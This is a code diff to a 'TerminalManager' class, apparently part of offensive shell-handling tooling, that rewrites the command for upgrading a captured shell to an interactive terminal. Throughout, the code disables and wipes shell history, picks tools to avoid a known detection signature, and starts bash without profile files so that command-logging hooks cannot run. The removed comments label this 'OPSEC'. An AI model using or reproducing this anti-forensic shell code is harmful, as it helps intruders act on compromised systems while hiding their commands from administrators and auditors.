@@ -47,24 +47,31 @@ class TerminalManager:
 
     def unix_pty_upgrade_cmd(self):
         rows, cols = self.rows, self.cols
-        # OPSEC:
-        #   - Suppress shell history unconditionally before spawning a
-        #     subshell so nothing from this session lands in ~/.bash_history.
-        #   - Prefer `script(1)` (a legitimate sysadmin utility) over
-        #     `python -c 'import pty; pty.spawn(...)'`, which is a
-        #     well-known detection signature.
-        #   - Commands are space-prefixed where HISTCONTROL=ignorespace is
-        #     honored, so the leading space itself is another layer.
         return (
+            # History suppression first, before anything else runs.
             f"unset HISTFILE; export HISTFILE=/dev/null; "
             f"export HISTSIZE=0; export HISTFILESIZE=0; "
             f"export HISTCONTROL=ignorespace; "
             f"set +o history 2>/dev/null; "
             f"export TERM=xterm-256color; "
             f" stty rows {rows} cols {cols} 2>/dev/null; "
-            f" script -qfc /bin/bash /dev/null "
-            f"|| script -q /dev/null /bin/bash "
-            f"|| /bin/bash -i "
+
+            # Prefer socat on Debian-family systems. --noprofile --norc
+            # prevents login files from resetting HISTFILE or installing
+            # command-logging hooks.
+            f"if command -v socat >/dev/null 2>&1 && command -v bash >/dev/null 2>&1; then "
+            f"  socat file:`tty`,raw,echo=0 "
+            f"EXEC:'/bin/bash --noprofile --norc -i',"
+            f"pty,stderr,setsid,sigint,sane; "
+            f"fi; "
+
+            # Fallback: script with explicit terminal allocation.
+            f"if command -v script >/dev/null 2>&1; then "
+            f"  script -qfc '/bin/bash --noprofile --norc -i' /dev/null; "
+            f"fi; "
+
+            # Last resort: run bash directly.
+            f"/bin/bash --noprofile --norc -i "
             f"|| /bin/sh -i"
         )
 
